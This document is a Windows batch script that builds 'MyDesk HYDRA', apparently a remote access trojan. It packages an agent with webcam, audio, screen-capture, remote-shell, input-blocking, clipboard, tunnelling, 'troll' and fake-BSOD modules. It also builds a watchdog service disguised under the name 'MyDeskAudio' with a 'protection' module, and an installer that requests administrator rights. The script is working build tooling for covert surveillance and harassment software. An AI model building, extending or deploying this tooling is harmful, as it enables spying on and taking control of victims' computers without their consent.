@echo off
setlocal
cd /d "%~dp0.."

echo ==========================================
echo       MyDesk HYDRA BUILD SYSTEM
echo ==========================================

:: 0. Syntax Check
echo [*] Checking Syntax (compileall)...
python -m compileall -q .
if %errorlevel% neq 0 (
    echo [!] Syntax Error Detected! Build Aborted.
    exit /b 1
)

:: 1. Cleanup build artifacts
echo [*] Cleaning build artifacts...
if exist build (
    rmdir /s /q build || (
        echo [!] Failed to remove build folder! Build Aborted.
        exit /b 1
    )
    echo [*] Removed build folder.
)

:: Remove .spec files
del /q *.spec 2>nul
echo [*] Removed .spec files.

:: Clean dist folder
if exist dist (
    rmdir /s /q dist
    if %errorlevel% neq 0 (
        echo [!] Failed to remove dist folder! Build Aborted.
        exit /b 1
    )
    mkdir dist
    echo [*] Cleaned up dist folder.
) else (
    mkdir dist
    echo [*] Created dist folder.
)
if %errorlevel% neq 0 (
    echo [!] Failed to clean up dist folder! Build Aborted.
    exit /b 1
)
:: 2. Build AGENT (Copied from build_all.bat)
echo [*] Building 1/3: MyDeskAgent.exe...
python -m PyInstaller --console --onefile --noupx --name MyDeskAgent ^
    --exclude-module matplotlib --exclude-module pandas ^
    --exclude-module scipy --exclude-module PyQt6 ^
    --exclude-module torch --exclude-module streamlit ^
    --exclude-module altair --exclude-module chess ^
    --exclude-module flask --exclude-module selenium --exclude-module sklearn ^
    --exclude-module pyarrow --exclude-module ipython --exclude-module jupyter ^
    --exclude-module google ^
    --exclude-module pywinauto --exclude-module uiautomation ^
    --exclude-module nodriver --exclude-module pynput --exclude-module dxcam ^
    --exclude-module pillow_jxl --exclude-module zstandard ^
    --exclude-module tkinter --exclude-module tcl ^
    --exclude-module test --exclude-module unittest ^
    --hidden-import=targets.input_controller ^
    --hidden-import=targets.capture ^
    --hidden-import=targets.audio ^
    --hidden-import=targets.webcam ^
    --hidden-import=targets.auditor ^
    --hidden-import=targets.shell_handler ^
    --hidden-import=targets.process_manager ^
    --hidden-import=targets.file_manager ^
    --hidden-import=targets.clipboard_handler ^
    --hidden-import=targets.device_settings ^
    --hidden-import=targets.troll_handler ^
    --hidden-import=targets.troll_video_player ^
    --hidden-import=targets.bsod_screen ^
    --hidden-import=targets.webrtc_handler ^
    --hidden-import=targets.webrtc_tracks ^
    --hidden-import=targets.resource_manager ^
    --hidden-import=targets.tunnel_manager ^
    --hidden-import=targets.input_blocker ^
    --hidden-import=pyaudiowpatch ^
    --hidden-import=aiortc --hidden-import=aiortc.codecs ^
    --hidden-import=aiortc.codecs.h264 --hidden-import=aiortc.contrib.media ^
    --hidden-import=av --hidden-import=av.video --hidden-import=av.audio ^
    --hidden-import=numpy ^
    --hidden-import=msgpack ^
    --hidden-import=PIL.Image ^
    --hidden-import=cv2 ^
    --hidden-import=psutil ^
    --add-data "targets;targets" ^
    agent_loader.py

if %errorlevel% neq 0 (
    echo [!] Agent Build Failed!
    exit /b %errorlevel%
)

:: Copy Cloudflared
echo [*] Copying Cloudflared...
if exist "cloudflared.exe" (
    copy /Y "cloudflared.exe" "dist\cloudflared.exe"
) else (
    echo [!] WARNING: cloudflared.exe not found!
)

:: 3. Build Service Shield (MyDeskAudio)
echo.
echo [*] Building 2/3: MyDeskAudio.exe...
python -m PyInstaller --onefile --console --name MyDeskAudio ^
    --hidden-import win32timezone ^
    --hidden-import servicemanager ^
    --hidden-import keyring ^
    --hidden-import keyrings.alt.Windows ^
    --hidden-import targets.protection ^
    targets/services/watcher.py

if %errorlevel% neq 0 (
    echo [!] Service Shield Build Failed!
    exit /b %errorlevel%
)
:: 5. Build Setup Bundle
echo.
echo [*] Building 3/3: MyDeskSetup.exe (Installer)...
python -m PyInstaller --onefile --console --name MyDeskSetup --uac-admin ^
    --add-binary "dist/MyDeskAgent.exe;." ^
    --add-binary "dist/MyDeskAudio.exe;." ^
    targets/services/install.py

if %errorlevel% neq 0 (
    echo [!] Installer Build Failed!
    exit /b %errorlevel%
)

echo.
echo ==========================================
echo         HYDRA BUILD COMPLETE!
echo ==========================================
echo Output: dist\MyDeskSetup.exe
echo.
